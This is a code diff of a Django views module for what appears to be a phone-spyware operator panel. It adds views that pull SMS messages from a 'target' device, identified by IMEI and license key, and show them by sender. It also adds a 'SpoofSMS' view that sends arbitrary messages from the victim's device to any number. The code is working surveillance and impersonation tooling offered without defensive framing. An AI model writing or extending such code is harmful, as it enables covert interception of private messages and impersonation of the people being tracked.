@@ -4,18 +4,18 @@ import json
 import uuid
 from inertia import render
 
-from authentication.tasks import send_email
+from authentication.tasks import fetch_sms, send_email, send_websocket_sms
 from .mixins import InertiaView
-from .forms import SignInForms, SignUpForms, SubscribeForm, TargetAliasNameForm
+from .forms import SignInForms, SignUpForms, SpoofSMSForm, SubscribeForm, TargetAliasNameForm
 from django.shortcuts import redirect
-from .models import User, Target
+from .models import SMSMessages, User, Target
 from django.utils.http import urlsafe_base64_encode, urlsafe_base64_decode
 from django.utils.encoding import force_bytes
 from django.contrib.auth.tokens import default_token_generator
 from django.urls import reverse
 from django.contrib.auth import authenticate, login
 from django.contrib.auth.mixins import LoginRequiredMixin
-
+from collections import defaultdict
 
 class SigninView(InertiaView):
     template_name = "SignIn"
@@ -25,7 +25,6 @@ class SigninView(InertiaView):
 
     def post(self, request, *args, **kwargs):
         form = SignInForms(json.loads(request.body))
-        print(form)
         if form.is_valid():
             username = form.cleaned_data['username']
             password = form.cleaned_data['password']
@@ -290,3 +289,88 @@ class TargetsView(LoginRequiredMixin, InertiaView):
             redirect("targets")
         except Target.DoesNotExist:
             redirect("targets")
+
+class MessagesView(LoginRequiredMixin, InertiaView):
+    template_name = "Messages"
+    login_url = "/signin"
+
+    def get_props(self):
+        user = self.request.user
+        target = Target.objects.get(status="active", user=user)
+        messages = SMSMessages.objects.filter(target=target).order_by("-date").values()
+
+        # Step 1: Group messages by address
+        grouped = defaultdict(list)
+        for msg in messages:
+            grouped[msg['address']].append(msg)
+
+        # Step 2: Sort messages inside each group (by date ascending)
+        for address in grouped:
+            grouped[address].sort(key=lambda x: x['date'])
+
+        # Step 3: Sort the groups by the most recent message (descending)
+        sorted_grouped = dict(
+            sorted(grouped.items(), key=lambda x: x[1][-1]['date'], reverse=True)
+        )
+
+        return {
+            "messages": sorted_grouped
+        }
+
+class SyncTargetView(LoginRequiredMixin, InertiaView):
+    login_url = "/signin"
+
+    def get(self, request, *args, **kwargs):
+        user = self.request.user
+        sync_type = kwargs["sync_type"]
+
+        try:
+            target = Target.objects.get(status="active", user=user)
+        except Target.DoesNotExist:
+            return redirect("targets")
+        
+        if sync_type == "sms":
+            fetch_sms.delay(target.id, target.device_imei, target.license_key)
+            redirect("messages")
+
+        return redirect("messages")
+
+class SpoofSMSView(LoginRequiredMixin, InertiaView):
+    template_name = "SpoofSms"
+    login_url = "/signin"
+
+    def get_props(self):
+        return{}
+    
+    def post(self, request, *args, **kwargs):
+        form = SpoofSMSForm(json.loads(request.body))
+
+        if form.is_valid():
+            user = self.request.user
+
+            try:
+                target = Target.objects.get(status="active", user=user)
+            except Target.DoesNotExist:
+                return render(request, self.template_name, props={
+                    "errors": {
+                        "phone": "Target not found",
+                    },
+                })
+
+            send_websocket_sms.delay(
+                target.id,
+                target.device_imei,
+                target.license_key,
+                form.cleaned_data["phone"],
+                form.cleaned_data["message"],
+            )
+
+            return render(request, self.template_name, props=self.get_props())
+        return render(request, self.template_name, props=self.get_props())
+
+class ContacsView(LoginRequiredMixin, InertiaView):
+    template_name = "Contacts"
+    login_url = "/signin"
+
+    def get_props(self):
+        return {}
